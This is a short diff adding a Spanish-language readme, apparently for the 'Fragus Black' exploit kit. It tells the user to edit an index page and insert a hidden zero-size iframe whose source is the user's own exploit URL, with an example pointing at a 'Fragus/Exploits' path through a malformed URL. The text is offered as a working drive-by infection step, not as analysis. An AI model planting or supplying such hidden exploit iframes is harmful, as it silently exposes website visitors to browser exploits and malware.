@@ -1,0 +1,15 @@
+Se agregaron mas opciones de inframe 
+Edita el index (carpeta inframe)
+
+Ejemplo
+
+Original
+<iframe src="Agrega la UrL de tu Exploit" width="0" height="0" frameborder="0"></iframe>
+
+Editado
+<iframe src="http:¡//www.Nod34.com/Fragus/Exploits" width="0" height="0" frameborder="0"></iframe>
+
+.Es un ejemplo cambia esa url por la tuya
+.Guarda los cambios y listo
+
+Fragus Black Vercion!
